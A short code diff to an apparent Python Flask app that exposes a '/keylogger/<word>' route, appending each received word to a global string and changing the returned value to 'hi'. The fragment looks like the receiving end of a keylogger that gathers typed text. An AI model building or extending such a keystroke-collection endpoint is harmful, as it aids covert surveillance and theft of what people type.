@@ -11,7 +11,7 @@ string_data = ''
 
 app.route('/keylogger/<word>', methods=["GET", "POST"])
 def check_word(word):
-    return word
+    return 'hi'
     word_detected = False
     global string_data
     string_data += str(word)
